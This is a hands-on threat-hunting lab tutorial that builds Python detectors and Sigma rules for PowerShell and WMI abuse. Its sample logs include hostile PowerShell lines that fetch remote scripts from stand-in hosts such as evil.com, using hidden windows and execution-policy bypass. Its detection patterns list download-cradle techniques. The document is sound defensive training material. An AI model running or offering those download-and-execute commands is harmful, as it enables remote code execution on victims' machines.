<div align="center">

# 🎯 Adversary Hunting Playbook: PowerShell + WMI Detection

![PowerShell](https://img.shields.io/badge/PowerShell-Detection-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![WMI](https://img.shields.io/badge/WMI-Query%20Monitoring-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Sigma](https://img.shields.io/badge/Sigma-Rules-orange?style=for-the-badge&logo=yaml&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-Cloud%20Lab-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-yellow?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Threat%20Hunting-blue?style=for-the-badge)

**A hands-on lab in building a PowerShell and WMI abuse detection playbook for adversary hunting**

</div>

---

## 📑 Table of Contents

- [🎯 Learning Objectives](#-learning-objectives)
- [📋 Prerequisites](#-prerequisites)
- [🖥️ Lab Environment](#️-lab-environment)
- [🔧 Task 1: PowerShell Reconnaissance Detection Setup](#-task-1-powershell-reconnaissance-detection-setup)
- [🧩 Task 2: WMI Query-Based Detection Setup](#-task-2-wmi-query-based-detection-setup)
- [🕵️ Task 3: Comprehensive Log Analysis](#️-task-3-comprehensive-log-analysis)
- [🗺️ MITRE ATT&CK Mapping](#️-mitre-attck-mapping)
- [🛠️ Troubleshooting](#️-troubleshooting)
- [✅ Conclusion](#-conclusion)
- [🌍 Practical Applications](#-practical-applications)

---

## 🎯 Learning Objectives

| # | Objective |
|---|-----------|
| 1 | Build detection rules for PowerShell reconnaissance activities |
| 2 | Configure WMI query-based monitoring and detection |
| 3 | Analyze log data to identify PowerShell and WMI abuse patterns |
| 4 | Create a comprehensive hunting playbook for Windows-based threats on Linux |

## 📋 Prerequisites

| Requirement | Details |
|---|---|
| 💻 PowerShell & WMI | Basic understanding of PowerShell and WMI concepts |
| 🐧 Linux CLI | Familiarity with Linux command line operations |
| 📊 Log Analysis | Knowledge of log analysis fundamentals |
| 🎯 Threat Hunting | Understanding of threat hunting methodologies |

## 🖥️ Lab Environment

> Al Nafi provides Linux-based cloud machines for this lab. Simply click **Start Lab** to access your dedicated environment. The provided Linux machine is bare metal with no pre-installed tools — you will install all required tools during the lab exercises.

---

## 🔧 Task 1: PowerShell Reconnaissance Detection Setup

### ✅ Subtask 1.1: Install Required Tools

```bash
# 📦 Update system packages
sudo apt update && sudo apt upgrade -y

# 🐍 Install Python and pip
sudo apt install python3 python3-pip -y

# 🧰 Install log analysis tools
sudo apt install jq curl wget git -y

# 📜 Install Sigma rule converter
pip3 install sigma-cli pysigma-backend-elasticsearch

# 📁 Create working directory
mkdir -p ~/hunting-lab && cd ~/hunting-lab
# TODO: Confirm all packages installed without dependency errors
```

### ✅ Subtask 1.2: Download Sample PowerShell Logs

```bash
# 📝 Create sample PowerShell execution logs
cat > powershell_logs.json << 'EOF'
{"timestamp":"2024-01-15T10:30:15Z","event_id":4103,"process":"powershell.exe","command":"Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}","user":"DOMAIN\\user1","host":"workstation01"}
{"timestamp":"2024-01-15T10:31:22Z","event_id":4104,"process":"powershell.exe","command":"Invoke-WebRequest -Uri http://malicious-site.com/payload.ps1 -OutFile C:\\temp\\payload.ps1","user":"DOMAIN\\user2","host":"workstation02"}
{"timestamp":"2024-01-15T10:32:45Z","event_id":4103,"process":"powershell.exe","command":"Get-WmiObject -Class Win32_Process","user":"DOMAIN\\user1","host":"workstation01"}
{"timestamp":"2024-01-15T10:33:10Z","event_id":4104,"process":"powershell.exe","command":"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadString('http://evil.com/script.ps1')","user":"DOMAIN\\user3","host":"workstation03"}
{"timestamp":"2024-01-15T10:34:33Z","event_id":4103,"process":"powershell.exe","command":"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}","user":"DOMAIN\\user1","host":"workstation01"}
EOF
# TODO: Note which event IDs correspond to script block vs. module logging
```

### ✅ Subtask 1.3: Create PowerShell Detection Rules

```python
#!/usr/bin/env python3
# 🎯 powershell_hunter.py — pattern-based PowerShell detection engine
import json
import re
from datetime import datetime

class PowerShellHunter:
    def __init__(self):
        self.suspicious_patterns = [
            r'Invoke-WebRequest.*http',
            r'DownloadString',
            r'ExecutionPolicy\s+Bypass',
            r'WindowStyle\s+Hidden',
            r'EncodedCommand',
            r'IEX\s*\(',
            r'powershell.*-c.*http',
            r'System\.Net\.WebClient'
        ]

        self.recon_patterns = [
            r'Get-Process',
            r'Get-WmiObject',
            r'Get-NetTCPConnection',
            r'Get-Service',
            r'whoami',
            r'net\s+user',
            r'Get-LocalUser'
        ]

    def analyze_command(self, command):
        alerts = []

        # Check for malicious patterns
        for pattern in self.suspicious_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                alerts.append(f"MALICIOUS: {pattern}")

        # Check for reconnaissance patterns
        for pattern in self.recon_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                alerts.append(f"RECON: {pattern}")

        return alerts

    def hunt_logs(self, log_file):
        detections = []

        with open(log_file, 'r') as f:
            for line in f:
                try:
                    log_entry = json.loads(line.strip())
                    command = log_entry.get('command', '')
                    alerts = self.analyze_command(command)

                    if alerts:
                        detection = {
                            'timestamp': log_entry.get('timestamp'),
                            'host': log_entry.get('host'),
                            'user': log_entry.get('user'),
                            'command': command,
                            'alerts': alerts,
                            'severity': 'HIGH' if any('MALICIOUS' in alert for alert in alerts) else 'MEDIUM'
                        }
                        detections.append(detection)

                except json.JSONDecodeError:
                    continue

        return detections

if __name__ == "__main__":
    hunter = PowerShellHunter()
    detections = hunter.hunt_logs('powershell_logs.json')

    print("=== PowerShell Threat Hunting Results ===")
    for detection in detections:
        print(f"\nTimestamp: {detection['timestamp']}")
        print(f"Host: {detection['host']}")
        print(f"User: {detection['user']}")
        print(f"Severity: {detection['severity']}")
        print(f"Command: {detection['command']}")
        print("Alerts:")
        for alert in detection['alerts']:
            print(f"  - {alert}")
    # TODO: Add a --json output flag for SIEM ingestion
```

```bash
# 🔑 Make script executable
chmod +x powershell_hunter.py
```

### ✅ Subtask 1.4: Execute PowerShell Detection

```bash
# ▶️ Execute PowerShell hunting
python3 powershell_hunter.py

# 💾 Save results to file
python3 powershell_hunter.py > powershell_detections.txt
# TODO: Review which log lines triggered HIGH vs MEDIUM severity
```

---

## 🧩 Task 2: WMI Query-Based Detection Setup

### ✅ Subtask 2.1: Create WMI Activity Logs

```bash
# 📝 Create WMI activity logs
cat > wmi_logs.json << 'EOF'
{"timestamp":"2024-01-15T11:15:30Z","event_id":5857,"process":"wmiprvse.exe","query":"SELECT * FROM Win32_Process","user":"DOMAIN\\user1","host":"server01","namespace":"root\\cimv2"}
{"timestamp":"2024-01-15T11:16:45Z","event_id":5858,"process":"powershell.exe","query":"SELECT * FROM Win32_Service WHERE State='Running'","user":"DOMAIN\\user2","host":"workstation04","namespace":"root\\cimv2"}
{"timestamp":"2024-01-15T11:17:22Z","event_id":5857,"process":"wmic.exe","query":"SELECT * FROM Win32_StartupCommand","user":"DOMAIN\\user3","host":"workstation05","namespace":"root\\cimv2"}
{"timestamp":"2024-01-15T11:18:10Z","event_id":5858,"process":"powershell.exe","query":"SELECT * FROM Win32_LoggedOnUser","user":"DOMAIN\\user1","host":"server01","namespace":"root\\cimv2"}
{"timestamp":"2024-01-15T11:19:33Z","event_id":5857,"process":"wmiprvse.exe","query":"SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True","user":"DOMAIN\\user4","host":"workstation06","namespace":"root\\cimv2"}
{"timestamp":"2024-01-15T11:20:15Z","event_id":5858,"process":"cmd.exe","query":"SELECT * FROM Win32_ComputerSystem","user":"DOMAIN\\admin","host":"dc01","namespace":"root\\cimv2"}
EOF
```

### ✅ Subtask 2.2: Build WMI Detection Engine

```python
#!/usr/bin/env python3
# 🧩 wmi_hunter.py — WMI query risk-scoring detection engine
import json
import re
from collections import defaultdict

class WMIHunter:
    def __init__(self):
        self.suspicious_classes = [
            'Win32_Process',
            'Win32_Service',
            'Win32_StartupCommand',
            'Win32_LoggedOnUser',
            'Win32_NetworkAdapterConfiguration',
            'Win32_ComputerSystem',
            'Win32_OperatingSystem',
            'Win32_UserAccount',
            'Win32_Group'
        ]

        self.high_risk_queries = [
            r'Win32_Process.*WHERE.*CommandLine',
            r'Win32_Service.*WHERE.*State',
            r'Win32_StartupCommand',
            r'Win32_LoggedOnUser',
            r'Win32_NetworkAdapter.*WHERE.*IPEnabled'
        ]

    def analyze_wmi_query(self, query, process, user):
        alerts = []
        risk_score = 0

        # Check for suspicious WMI classes
        for wmi_class in self.suspicious_classes:
            if wmi_class in query:
                alerts.append(f"WMI_CLASS: {wmi_class}")
                risk_score += 1

        # Check for high-risk query patterns
        for pattern in self.high_risk_queries:
            if re.search(pattern, query, re.IGNORECASE):
                alerts.append(f"HIGH_RISK_QUERY: {pattern}")
                risk_score += 2

        # Check for suspicious processes
        if process.lower() in ['powershell.exe', 'cmd.exe', 'wmic.exe']:
            alerts.append(f"SUSPICIOUS_PROCESS: {process}")
            risk_score += 1

        # Determine severity
        if risk_score >= 4:
            severity = 'CRITICAL'
        elif risk_score >= 2:
            severity = 'HIGH'
        else:
            severity = 'MEDIUM'

        return alerts, severity, risk_score

    def hunt_wmi_logs(self, log_file):
        detections = []
        user_activity = defaultdict(int)
        host_activity = defaultdict(int)

        with open(log_file, 'r') as f:
            for line in f:
                try:
                    log_entry = json.loads(line.strip())
                    query = log_entry.get('query', '')
                    process = log_entry.get('process', '')
                    user = log_entry.get('user', '')
                    host = log_entry.get('host', '')

                    # Track activity patterns
                    user_activity[user] += 1
                    host_activity[host] += 1

                    alerts, severity, risk_score = self.analyze_wmi_query(query, process, user)

                    if alerts:
                        detection = {
                            'timestamp': log_entry.get('timestamp'),
                            'host': host,
                            'user': user,
                            'process': process,
                            'query': query,
                            'namespace': log_entry.get('namespace'),
                            'alerts': alerts,
                            'severity': severity,
                            'risk_score': risk_score
                        }
                        detections.append(detection)

                except json.JSONDecodeError:
                    continue

        return detections, user_activity, host_activity

    def generate_summary(self, detections, user_activity, host_activity):
        print("\n=== WMI Activity Summary ===")
        print(f"Total Detections: {len(detections)}")

        severity_counts = defaultdict(int)
        for detection in detections:
            severity_counts[detection['severity']] += 1

        print("\nSeverity Distribution:")
        for severity, count in severity_counts.items():
            print(f"  {severity}: {count}")

        print("\nTop Active Users:")
        for user, count in sorted(user_activity.items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  {user}: {count} queries")

        print("\nTop Active Hosts:")
        for host, count in sorted(host_activity.items(), key=lambda x: x[1], reverse=True)[:5]:
            print(f"  {host}: {count} queries")

if __name__ == "__main__":
    hunter = WMIHunter()
    detections, user_activity, host_activity = hunter.hunt_wmi_logs('wmi_logs.json')

    print("=== WMI Threat Hunting Results ===")
    for detection in detections:
        print(f"\nTimestamp: {detection['timestamp']}")
        print(f"Host: {detection['host']}")
        print(f"User: {detection['user']}")
        print(f"Process: {detection['process']}")
        print(f"Severity: {detection['severity']} (Risk Score: {detection['risk_score']})")
        print(f"Query: {detection['query']}")
        print(f"Namespace: {detection['namespace']}")
        print("Alerts:")
        for alert in detection['alerts']:
            print(f"  - {alert}")

    hunter.generate_summary(detections, user_activity, host_activity)
    # TODO: Tune risk_score thresholds against your own baseline traffic
```

```bash
# 🔑 Make script executable
chmod +x wmi_hunter.py
```

### ✅ Subtask 2.3: Execute WMI Detection

```bash
# ▶️ Execute WMI hunting
python3 wmi_hunter.py

# 💾 Save WMI results
python3 wmi_hunter.py > wmi_detections.txt
# TODO: Compare CRITICAL vs HIGH detections and validate against expected behavior
```

---

## 🕵️ Task 3: Comprehensive Log Analysis

### ✅ Subtask 3.1: Create Combined Analysis Engine

```python
#!/usr/bin/env python3
# 🧠 hunting_playbook.py — integrated PowerShell + WMI correlation engine
import json
import re
from datetime import datetime
from collections import defaultdict, Counter

class ComprehensiveHunter:
    def __init__(self):
        # Initialize both hunters
        self.powershell_patterns = {
            'malicious': [
                r'Invoke-WebRequest.*http',
                r'DownloadString',
                r'ExecutionPolicy\s+Bypass',
                r'WindowStyle\s+Hidden',
                r'EncodedCommand',
                r'IEX\s*\(',
                r'System\.Net\.WebClient'
            ],
            'recon': [
                r'Get-Process',
                r'Get-WmiObject',
                r'Get-NetTCPConnection',
                r'Get-Service',
                r'whoami',
                r'net\s+user'
            ]
        }

        self.wmi_suspicious_classes = [
            'Win32_Process', 'Win32_Service', 'Win32_StartupCommand',
            'Win32_LoggedOnUser', 'Win32_NetworkAdapterConfiguration'
        ]

    def analyze_timeline(self, all_events):
        """Analyze events for temporal patterns"""
        timeline_analysis = {
            'rapid_succession': [],
            'user_patterns': defaultdict(list),
            'host_patterns': defaultdict(list)
        }

        # Sort events by timestamp
        sorted_events = sorted(all_events, key=lambda x: x.get('timestamp', ''))

        # Check for rapid succession attacks
        for i in range(len(sorted_events) - 1):
            current = sorted_events[i]
            next_event = sorted_events[i + 1]

            if (current.get('user') == next_event.get('user') and
                current.get('severity', 'LOW') in ['HIGH', 'CRITICAL']):
                timeline_analysis['rapid_succession'].append({
                    'user': current.get('user'),
                    'events': [current, next_event]
                })

        # Group by user and host
        for event in all_events:
            user = event.get('user', 'unknown')
            host = event.get('host', 'unknown')
            timeline_analysis['user_patterns'][user].append(event)
            timeline_analysis['host_patterns'][host].append(event)

        return timeline_analysis

    def correlate_events(self, powershell_events, wmi_events):
        """Correlate PowerShell and WMI events for advanced threats"""
        correlations = []

        # Combine all events
        all_events = powershell_events + wmi_events

        # Look for same user/host combinations
        user_host_combos = defaultdict(list)
        for event in all_events:
            key = f"{event.get('user', 'unknown')}@{event.get('host', 'unknown')}"
            user_host_combos[key].append(event)

        # Find suspicious correlations
        for combo, events in user_host_combos.items():
            if len(events) > 1:
                has_powershell = any('powershell' in event.get('type', '') for event in events)
                has_wmi = any('wmi' in event.get('type', '') for event in events)

                if has_powershell and has_wmi:
                    correlations.append({
                        'user_host': combo,
                        'events': events,
                        'correlation_type': 'PowerShell + WMI',
                        'risk_level': 'HIGH'
                    })

        return correlations

    def generate_hunting_report(self, powershell_file, wmi_file):
        """Generate comprehensive hunting report"""
        # Process PowerShell logs
        powershell_events = []
        try:
            with open(powershell_file, 'r') as f:
                for line in f:
                    try:
                        log_entry = json.loads(line.strip())
                        command = log_entry.get('command', '')
                        alerts = []

                        for category, patterns in self.powershell_patterns.items():
                            for pattern in patterns:
                                if re.search(pattern, command, re.IGNORECASE):
                                    alerts.append(f"{category.upper()}: {pattern}")

                        if alerts:
                            event = log_entry.copy()
                            event['alerts'] = alerts
                            event['type'] = 'powershell'
                            event['severity'] = 'HIGH' if any('MALICIOUS' in alert for alert in alerts) else 'MEDIUM'
                            powershell_events.append(event)
                    except json.JSONDecodeError:
                        continue
        except FileNotFoundError:
            print(f"Warning: {powershell_file} not found")

        # Process WMI logs
        wmi_events = []
        try:
            with open(wmi_file, 'r') as f:
                for line in f:
                    try:
                        log_entry = json.loads(line.strip())
                        query = log_entry.get('query', '')
                        alerts = []

                        for wmi_class in self.wmi_suspicious_classes:
                            if wmi_class in query:
                                alerts.append(f"WMI_CLASS: {wmi_class}")

                        if alerts:
                            event = log_entry.copy()
                            event['alerts'] = alerts
                            event['type'] = 'wmi'
                            event['severity'] = 'MEDIUM'
                            wmi_events.append(event)
                    except json.JSONDecodeError:
                        continue
        except FileNotFoundError:
            print(f"Warning: {wmi_file} not found")

        # Perform analysis
        timeline_analysis = self.analyze_timeline(powershell_events + wmi_events)
        correlations = self.correlate_events(powershell_events, wmi_events)

        # Generate report
        print("=" * 60)
        print("COMPREHENSIVE THREAT HUNTING REPORT")
        print("=" * 60)

        print(f"\nEVENT SUMMARY:")
        print(f"PowerShell Events: {len(powershell_events)}")
        print(f"WMI Events: {len(wmi_events)}")
        print(f"Total Events: {len(powershell_events + wmi_events)}")

        print(f"\nCORRELATIONS FOUND: {len(correlations)}")
        for correlation in correlations:
            print(f"\n  User/Host: {correlation['user_host']}")
            print(f"  Type: {correlation['correlation_type']}")
            print(f"  Risk Level: {correlation['risk_level']}")
            print(f"  Events: {len(correlation['events'])}")

        print(f"\nRAPID SUCCESSION ATTACKS: {len(timeline_analysis['rapid_succession'])}")
        for attack in timeline_analysis['rapid_succession']:
            print(f"  User: {attack['user']} - {len(attack['events'])} events")

        print(f"\nTOP ACTIVE USERS:")
        user_counts = Counter()
        for events in timeline_analysis['user_patterns'].values():
            for event in events:
                user_counts[event.get('user', 'unknown')] += 1

        for user, count in user_counts.most_common(5):
            print(f"  {user}: {count} events")

        print(f"\nTOP ACTIVE HOSTS:")
        host_counts = Counter()
        for events in timeline_analysis['host_patterns'].values():
            for event in events:
                host_counts[event.get('host', 'unknown')] += 1

        for host, count in host_counts.most_common(5):
            print(f"  {host}: {count} events")

        # Detailed event listing
        print(f"\nDETAILED EVENTS:")
        all_events = sorted(powershell_events + wmi_events,
                          key=lambda x: x.get('timestamp', ''))

        for event in all_events:
            print(f"\n  Timestamp: {event.get('timestamp')}")
            print(f"  Type: {event.get('type', 'unknown').upper()}")
            print(f"  Host: {event.get('host')}")
            print(f"  User: {event.get('user')}")
            print(f"  Severity: {event.get('severity')}")
            if event.get('command'):
                print(f"  Command: {event.get('command')[:100]}...")
            if event.get('query'):
                print(f"  Query: {event.get('query')}")
            print(f"  Alerts: {', '.join(event.get('alerts', []))}")

if __name__ == "__main__":
    hunter = ComprehensiveHunter()
    hunter.generate_hunting_report('powershell_logs.json', 'wmi_logs.json')
    # TODO: Extend correlate_events() to weight rarity of user/host combos
```

```bash
# 🔑 Make script executable
chmod +x hunting_playbook.py
```

### ✅ Subtask 3.2: Execute Comprehensive Analysis

```bash
# ▶️ Execute comprehensive hunting analysis
python3 hunting_playbook.py

# 💾 Save comprehensive report
python3 hunting_playbook.py > comprehensive_hunting_report.txt

# 📊 Display summary statistics
echo "=== HUNTING PLAYBOOK SUMMARY ==="
echo "Files created:"
ls -la *.txt *.json *.py | grep -E '\.(txt|json|py)$'
```

### ✅ Subtask 3.3: Create Detection Rules Export

```yaml
# 📜 detection_rules.yml — portable Sigma-style detection rules
title: PowerShell Malicious Activity Detection
id: ps-malicious-001
description: Detects suspicious PowerShell execution patterns
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: [4103, 4104]
    CommandLine|contains:
      - 'Invoke-WebRequest'
      - 'DownloadString'
      - 'ExecutionPolicy Bypass'
      - 'WindowStyle Hidden'
      - 'EncodedCommand'
  condition: selection
falsepositives:
  - Legitimate administrative scripts
level: high

---
title: WMI Reconnaissance Detection
id: wmi-recon-001
description: Detects WMI queries used for reconnaissance
logsource:
  product: windows
  service: wmi
detection:
  selection:
    EventID: [5857, 5858]
    Query|contains:
      - 'Win32_Process'
      - 'Win32_Service'
      - 'Win32_LoggedOnUser'
      - 'Win32_NetworkAdapterConfiguration'
  condition: selection
falsepositives:
  - System monitoring tools
level: medium
```

```bash
echo "Detection rules created: detection_rules.yml"
# TODO: Import detection_rules.yml into your SIEM or Sigma converter pipeline
```

### ✅ Subtask 3.4: Validate Detection Effectiveness

```python
#!/usr/bin/env python3
# ✅ validate_detections.py — sanity-checks generated output files
import json

def validate_detections():
    print("=== DETECTION VALIDATION ===")

    # Count PowerShell detections
    try:
        with open('powershell_logs.json', 'r') as f:
            ps_logs = len(f.readlines())
        print(f"PowerShell logs processed: {ps_logs}")
    except FileNotFoundError:
        print("PowerShell logs: Not found")

    # Count WMI detections
    try:
        with open('wmi_logs.json', 'r') as f:
            wmi_logs = len(f.readlines())
        print(f"WMI logs processed: {wmi_logs}")
    except FileNotFoundError:
        print("WMI logs: Not found")

    # Check detection outputs
    detection_files = [
        'powershell_detections.txt',
        'wmi_detections.txt',
        'comprehensive_hunting_report.txt'
    ]

    for file in detection_files:
        try:
            with open(file, 'r') as f:
                content = f.read()
                if content:
                    print(f"✓ {file}: Generated successfully")
                else:
                    print(f"✗ {file}: Empty file")
        except FileNotFoundError:
            print(f"✗ {file}: Not found")

    print("\n=== VALIDATION COMPLETE ===")

if __name__ == "__main__":
    validate_detections()
```

```bash
python3 validate_detections.py
# TODO: Re-run after adding new sample logs to confirm all outputs regenerate
```

---

## 🗺️ MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic | Lab Reference |
|---|---|---|---|
| T1059.001 | PowerShell | Execution | `powershell_hunter.py` pattern set |
| T1047 | Windows Management Instrumentation | Execution | `wmi_hunter.py` query analysis |
| T1105 | Ingress Tool Transfer | Command and Control | `Invoke-WebRequest` / `DownloadString` patterns |
| T1027 | Obfuscated Files or Information | Defense Evasion | `EncodedCommand` / `ExecutionPolicy Bypass` detection |
| T1057 | Process Discovery | Discovery | `Get-Process` / `Win32_Process` detections |
| T1049 | System Network Connections Discovery | Discovery | `Get-NetTCPConnection` detection |
| T1033 | System Owner/User Discovery | Discovery | `whoami` / `Win32_LoggedOnUser` detection |
| T1569 | System Services | Execution | `Win32_Service` / `Win32_StartupCommand` detection |

---

## 🛠️ Troubleshooting

<details>
<summary>❗ Issue 1: Python Script Fails with "File Not Found"</summary>

```bash
# Confirm log files were generated in the working directory
ls -la ~/hunting-lab/*.json
cd ~/hunting-lab
```

</details>

<details>
<summary>❗ Issue 2: No Detections Generated from Sample Logs</summary>

```bash
# Verify JSON formatting is valid line-delimited JSON
cat powershell_logs.json | python3 -m json.tool
head -1 wmi_logs.json | python3 -m json.tool
```

</details>

<details>
<summary>❗ Issue 3: Sigma Rule Conversion Errors</summary>

```bash
# Validate sigma-cli installation and YAML syntax
sigma-cli --version
python3 -c "import yaml; yaml.safe_load(open('detection_rules.yml'))" && echo "Valid YAML"
```

</details>

---

## ✅ Conclusion

You have successfully created a comprehensive adversary hunting playbook for detecting PowerShell and WMI abuse. This lab demonstrated:

- 🎯 Built PowerShell reconnaissance detection using pattern matching and behavioral analysis
- 🧩 Implemented WMI query-based monitoring to identify suspicious system queries
- 🕵️ Created integrated log analysis capabilities for comprehensive threat hunting
- 🔗 Developed correlation techniques to identify advanced attack patterns
- 📜 Generated portable detection rules for operational deployment

This hunting playbook provides a foundation for detecting Windows-based threats using open-source tools on Linux systems, enabling effective threat hunting regardless of the analysis platform. The modular approach allows for easy customization and extension based on specific organizational needs and threat landscapes.

## 🌍 Practical Applications

| Application | Description |
|---|---|
| 🏢 Security Operations Centers (SOCs) | Identify lateral movement and reconnaissance activities |
| 🚨 Incident Response Teams | Leverage correlation methods to understand attack timelines |
| 🎯 Threat Hunters | Adapt detection patterns for specific environments |
| 🛡️ Security Engineers | Implement these rules in SIEM platforms for automated detection |

---

<div align="center">

### 🛡️ Al Nafi Cloud Labs
*Empowering the Next Generation of Cybersecurity Professionals*

![Al Nafi](https://img.shields.io/badge/Al%20Nafi-Cloud%20Security%20Labs-1a1a2e?style=for-the-badge)

</div>
